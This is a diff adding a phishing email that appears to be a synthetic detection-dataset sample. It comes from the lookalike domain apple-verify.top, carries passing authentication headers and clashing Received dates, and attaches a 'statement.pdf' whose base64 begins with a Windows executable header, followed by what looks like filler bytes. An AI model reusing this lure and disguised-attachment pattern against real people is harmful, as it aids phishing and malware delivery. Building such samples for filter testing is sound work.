@@ -1,0 +1,45 @@
+From: notice@apple-verify.top
+To: victim1@example.com
+Subject: Meeting notes for the west power desk [ref A37FF2D]
+Date: Tue, 04 Mar 2002 06:24:00 -0500
+Message-ID: <phish-61-25ea0661-32ff-4775-9dc3-134bd804591b@apple-verify.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 25 Mar 2002 01:51:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 21 Mar 2002 23:59:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 07 Mar 2002 10:48:00 -0500
+Return-Path: <notice@apple-verify.top>
+Reply-To: notice@apple-verify.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=apple-verify.top; dkim=pass header.d=apple-verify.top; dmarc=pass header.from=apple-verify.top
+Received-SPF: pass (mx.example.com: domain of notice@apple-verify.top designates 192.0.2.41 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-verify.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-61-c2d674ee"
+
+--bnd-p-61-c2d674ee
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A37FF2D
+
+Thanks,
+Colleague
+--bnd-p-61-c2d674ee
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAM8Rv5OGytrlLvKD3Twc/rC4avuDY3Rvgv0IBd3CFrsMIdesshaxC92K2bpVKOEyW3e3wd/s
+3oQ9Ceurd1kdRKPIZjIKAf4hcjzbv4bYvPzxexMOFselRysSfUqvumhdLYz0gaMTioCPY/v+6BKB
+q4rCNY8y6rzuRMh+s/S+2de4hVCF74+2Y0DqL4EIqnnme0i2P5yTwLAI0JAXwucUkUqt8MaI2Gre
+OfiCUlkv/WMP0qH/jc//aIVEc3dCubMbMXsaTnZuR7R4FoSUtHtpHIX4W3hPj/JIsxK6+cIzEx7I
+BLQnf8eGkXlwarz4y9+FwftxzLbdpzGoxoe0pxAs+TYeLdz8dQ4ejr9+gV63VjY91MeMdpuZJCgw
+xF44LvsgqwYPj7opMnHFWkb267OBnKUWpoiyX4JUDHtcbd21BbmKEasZaQKuWu7j8VCSdwQhvg0r
+4FzjlFMAIfwpRGxc7xvgbbMHtkMRNySF23zfd1D6oZrs3IGm1x9DzB7txMKPKpVMseAUlb7ljkuZ
+/Mq/fUWED2aEVdam5+uujaIcV1AnktzKlFKwXJ3T/BGoWzdhlB0Sa0JgGhgAsH85Vrhbazk5gmqh
+t7580Tc1yB9FJDqiwofFKFI8tWJB1Svs6H3hzTRGlf4VdWW+9qbs9XYF5W+siAE1XdB3VVLC32ns
+PwUfxc7PNZ6wDolXgadFyyt18DuY0euimCHEcRZjEgrmxTmO8J2Tirh77uKwn3oqIciB9LxEKbPT
+OW0+n9nqVYUp7W9qCNMQxPAOPUgpq5pwlofO7zrVpwkcbIj08yOujJVK3zq13zglhdMpvaE2yimD
+0TuAuMlHu6+Z0jHQ8Q==
+
+--bnd-p-61-c2d674ee--
